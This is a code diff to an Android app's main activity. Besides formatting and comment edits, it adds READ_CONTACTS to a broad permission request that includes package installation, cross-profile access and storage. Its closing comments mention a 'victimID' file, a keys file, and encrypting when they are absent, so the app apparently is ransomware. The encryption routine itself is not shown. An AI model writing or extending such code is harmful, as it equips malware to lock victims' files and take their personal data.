@@ -17,11 +17,11 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
 import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.appcompat.widget.Toolbar;
 import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
 import java.io.File;
 import java.io.IOException;
@@ -46,7 +46,7 @@ public class MainActivity extends AppCompatActivity {
 
     public static boolean hasPermissions(Context context, String[] permissions){
         if (context != null && permissions != null) {
-            for (String permission : permissions){
+            for (String permission : permissions) {
                 if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                     return false;
                 }
@@ -55,6 +55,7 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
+
     @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -62,7 +63,7 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         view = (MainView) findViewById(R.id.view);
 
-        // Request permissions
+        // Permissions handling
         String[] PERMISSIONS = {
             Manifest.permission.ACCESS_NETWORK_STATE,
             Manifest.permission.ACCESS_WIFI_STATE,
@@ -70,10 +71,12 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.INTERACT_ACROSS_PROFILES,
-            Manifest.permission.REQUEST_INSTALL_PACKAGES
+            Manifest.permission.REQUEST_INSTALL_PACKAGES,
+            Manifest.permission.READ_CONTACTS
         };
         int PERMISSION_ALL = 1;
 
+        // Request permissions
         if (!hasPermissions(this, PERMISSIONS)) {
             ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
         }
@@ -87,6 +90,7 @@ public class MainActivity extends AppCompatActivity {
                 startActivity(intent);
             }
         });
+
 
         // Check if /sdcard/keys.json && /sdcard/victimID.txt exist
         // If exist, don't encrypt, else proceed to encrypt
